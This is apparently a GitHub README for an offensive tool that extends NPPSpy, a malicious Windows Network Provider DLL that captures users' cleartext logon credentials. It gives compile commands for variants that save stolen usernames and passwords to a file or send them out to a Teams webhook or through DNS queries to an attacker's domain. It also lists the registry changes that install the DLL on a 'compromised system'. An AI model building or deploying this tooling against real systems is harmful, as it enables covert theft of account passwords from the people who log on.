NPPSpy and NPPSPy2 are great tools to retrieve user credentials in many cases. In this repository, I will add some encryption and exfiltration methods to these tools by gtworek.

Repository: [https://github.com/ricardojoserf/anp](https://github.com/ricardojoserf/anp)

<br>

The original tools, NPPSpy and NPPSpy2, manipulate the authentication process by using a malicious DLL which helps offensive professionals capturing usernames and passwords before encryption. This is amazing when the system has enabled protections such as PPL or Credential Guard but the security software is not monitoring the creation/manipulation of registry keys (not so typical but it is interesting to check the Blue Team detects it). 

This repository are tests to create Network Providers based on the mentioned tools by [gtworek](https://github.com/gtworek). All credit goes to the original author - I'm simply adding some functionality to explore what works best for me, but I thought it could be interesting for someone so I decided to make it public :)

I will use Base64-encoding or AES-encryption in all examples with the following JSON-like structure to store the information: 

```json
{"timestamp":"TIMESTAMP","operation":"OPERATION","domain":"DOMAIN","username":"USERNAME","password":"PASSWORD"}
```


<br>

## 1. Store in a text file + Base64-encoding

The default path is "C:\Windows\Task\default.txt" but you can customize it using the macro /DFILE_PATH:

```powershell
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" 1_textfile_base64.c crypt32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```bash
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9PTEQiLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InFxIn0=
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9ORVciLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InEifQ==
```

Which decoded is:

```json
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 2. Store in a text file + AES-encryption

The default path is "C:\Windows\Task\default.txt" and the default AES password is "TEST1234", but you can customize it using the macros /DFILE_PATH and /DAES_PWD:

```powershell
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```bash
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

You can decrypt it using *decrypt_aes.py*:

```bash
python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

And you get:

```json
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 3. Send to Teams webhook + Base64-encoding

There is not a default webhook url, you have to set the value using the macro /DWEBHOOK_URL:

```powershell
cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib /link /OUT:anp.dll
```

The information is received in a similar way to option 1:

![imgteams1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_teams1.png)

<br>

## 4. Send to Teams webhook + AES-encryption

You have to set the webhook url value using the macro /DWEBHOOK_URL, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:

```powershell
cl /LD /DWEBHOOK_URL=L\"https://...\" /DAES_PWD=\"TEST1234\" 4_webhook_aes.c crypt32.lib wininet.lib advapi32.lib /link /OUT:anp.dll
```

The information is received in a similar way to option 2:

![imgteams2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_teams2.png)


<br>

## 5. DNS exfiltration + Base64-encoding

This one is not ideal, as the maximum length for a subdomain is 63 characters so it requires multiple DNS queries. As a result, the logon process is delayed by a few seconds, making the slowdown noticeable in some cases.

There is not a default subdomain, you have to set the value using the macro /DSUBDOMAIN:

```powershell
cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" 5_dns_base64.c crypt32.lib /link /OUT:anp.dll
```

You can use [this repository](https://github.com/ricardojoserf/dns-exfiltration) for creating the necessary subdomains and the *dns_server.py* script to decode the received values.

```bash
python3 dns_server.py .SUBDOMAIN.DOMAIN.COM
```

![imgdns1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns1.png)

It also generates a log file with the subdomains and decoded values:

![imgdns2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns2.png)

<br>

## 6. DNS exfiltration + AES-encryption

You have to set the subdomain value using the macro /DSUBDOMAIN, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:

```powershell
cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" /DAES_PWD=\"TEST1234\" 6_dns_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
```

You can use the *dns_server.py* script again to receive resolved domains and store it in a file:

![imgdns3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns3.png)

And the *decrypt_aes.py* script to decrypt the values:

![imgdns4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns4.png)

--------------------

## Installation

You can follow the instructions in [NPPSpy](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy) by [gtworek](https://github.com/gtworek), which can be summed up to:

- Copy the DLL to a path in the compromised system.

- Add a network provider name at the end of the "ProviderOrder" in `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`. For this example I will use "anp".

- Create a key with the format `HKLM\SYSTEM\CurrentControlSet\Services\<CHOSEN_NAME>\NetworkProvider`, for the example I will use `HKLM\SYSTEM\CurrentControlSet\Services\anp\NetworkProvider`.

  - Class = [REG_DWORD]2 - Always this value.

  - ProviderPath = [REG_EXPAND_SZ]"C:\Users\ricardo\Desktop\test.dll" - Path to the DLL.

  - Name = [REG_SZ]"anp" - The name you chose, in this case I will use "anp".

## TO-DOs

- Implement more exfiltration techniques (PRs are welcome!)
